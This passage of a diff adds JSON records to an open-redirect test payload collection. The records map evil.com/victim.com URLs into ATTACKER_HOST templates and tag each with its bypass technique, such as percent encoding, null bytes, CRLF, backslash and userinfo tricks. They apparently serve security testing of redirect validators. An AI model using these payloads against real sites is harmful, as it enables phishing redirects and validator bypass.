+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?returnTo=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0160",
+      "payload": "?returnTo=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?returnTo=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?returnTo=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0161",
+      "payload": "?return_to=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?return_to=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?return_to=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0162",
+      "payload": "?return_to=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?return_to=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?return_to=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0163",
+      "payload": "?return_to=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?return_to=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?return_to=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0164",
+      "payload": "?checkout_url=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?checkout_url=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?checkout_url=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0165",
+      "payload": "?checkout_url=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?checkout_url=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?checkout_url=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0166",
+      "payload": "?checkout_url=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?checkout_url=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?checkout_url=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0167",
+      "payload": "?continue=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?continue=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?continue=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0168",
+      "payload": "?continue=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?continue=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?continue=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0169",
+      "payload": "?continue=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?continue=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?continue=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0170",
+      "payload": "?return_path=//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?return_path=//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?return_path=//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0171",
+      "payload": "?return_path=https://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?return_path=https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?return_path=https://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0172",
+      "payload": "?return_path=http://evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "?return_path=http://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "?return_path=http://{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0173",
+      "payload": "/redirect?url=evil.com",
+      "families": [
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url={{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url={{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0174",
+      "payload": "/redirect?url=//evil%E3%80%82com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//evil%E3%80%82com",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//evil%E3%80%82com",
+      "transport_profile": "request-template",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0175",
+      "payload": "/redirect?url=//evil%00.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//evil%00.com",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//evil%00.com",
+      "transport_profile": "request-template",
+      "required_placeholders": [],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0176",
+      "payload": "/redirect?url=/\\/\\/evil.com",
+      "families": [
+        "backslash_and_slash_confusion",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=/\\/\\/{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=/\\/\\/{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0177",
+      "payload": "/redirect?url=\\/\\/evil.com",
+      "families": [
+        "backslash_and_slash_confusion",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=\\/\\/{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=\\/\\/{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0178",
+      "payload": "/redirect?url=%0D%0A//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=%0D%0A//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=%0D%0A//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0179",
+      "payload": "/redirect?url=%00//evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=%00//{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=%00//{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0198",
+      "payload": "/redirect?url=.evil.com",
+      "families": [
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=.{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=.{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0199",
+      "payload": "/redirect?url=..evil.com",
+      "families": [
+        "dot_segment_or_path_normalization",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=..{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=..{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0200",
+      "payload": "/redirect?url=...evil.com",
+      "families": [
+        "dot_segment_or_path_normalization",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=...{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=...{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0301",
+      "payload": "/redirect?url=%2F%2Fevil.com",
+      "families": [
+        "percent_or_escape_encoding",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=%2F%2F{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=%2F%2F{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0302",
+      "payload": "/redirect?url=%2F%2F%2Fevil.com",
+      "families": [
+        "percent_or_escape_encoding",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=%2F%2F%2F{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=%2F%2F%2F{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0303",
+      "payload": "/redirect?url=%2F%2F%2F%2Fevil.com",
+      "families": [
+        "percent_or_escape_encoding",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=%2F%2F%2F%2F{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=%2F%2F%2F%2F{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0304",
+      "payload": "/redirect?url=%5C%5Cevil.com",
+      "families": [
+        "backslash_and_slash_confusion",
+        "percent_or_escape_encoding",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=%5C%5C{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=%5C%5C{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0305",
+      "payload": "/redirect?url=%5C%5C%5Cevil.com",
+      "families": [
+        "backslash_and_slash_confusion",
+        "percent_or_escape_encoding",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=%5C%5C%5C{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=%5C%5C%5C{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0328",
+      "payload": "/redirect?url=//evil.com%20@victim.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "userinfo_and_authority_delimiters",
+        "percent_or_escape_encoding",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//{{ATTACKER_HOST}}%20@{{ALLOWED_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//{{ATTACKER_HOST}}%20@{{ALLOWED_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ALLOWED_HOST",
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0329",
+      "payload": "/redirect?url=https://evil.com%20@victim.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "userinfo_and_authority_delimiters",
+        "percent_or_escape_encoding",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=https://{{ATTACKER_HOST}}%20@{{ALLOWED_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=https://{{ATTACKER_HOST}}%20@{{ALLOWED_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ALLOWED_HOST",
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0330",
+      "payload": "/redirect?url=http://evil.com%20@victim.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "userinfo_and_authority_delimiters",
+        "percent_or_escape_encoding",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=http://{{ATTACKER_HOST}}%20@{{ALLOWED_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=http://{{ATTACKER_HOST}}%20@{{ALLOWED_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ALLOWED_HOST",
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0348",
+      "payload": "/redirect?url=//evil.com&victim.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//{{ATTACKER_HOST}}&{{ALLOWED_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//{{ATTACKER_HOST}}&{{ALLOWED_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ALLOWED_HOST",
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0349",
+      "payload": "/redirect?url=https://evil.com&victim.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=https://{{ATTACKER_HOST}}&{{ALLOWED_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=https://{{ATTACKER_HOST}}&{{ALLOWED_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ALLOWED_HOST",
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0350",
+      "payload": "/redirect?url=http://evil.com&victim.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "http_https_scheme_or_absolute_url",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=http://{{ATTACKER_HOST}}&{{ALLOWED_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=http://{{ATTACKER_HOST}}&{{ALLOWED_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ALLOWED_HOST",
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0357",
+      "payload": "/redirect?url=//evil.com%00victim.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//{{ATTACKER_HOST}}%00{{ALLOWED_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//{{ATTACKER_HOST}}%00{{ALLOWED_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ALLOWED_HOST",
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0358",
+      "payload": "/redirect?url=//evil.com%20victim.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//{{ATTACKER_HOST}}%20{{ALLOWED_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//{{ATTACKER_HOST}}%20{{ALLOWED_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ALLOWED_HOST",
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0359",
+      "payload": "/redirect?url=//evil.com%09victim.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//{{ATTACKER_HOST}}%09{{ALLOWED_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//{{ATTACKER_HOST}}%09{{ALLOWED_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ALLOWED_HOST",
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0364",
+      "payload": "/redirect?url=//%2Fevil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//%2F{{ATTACKER_HOST}}",
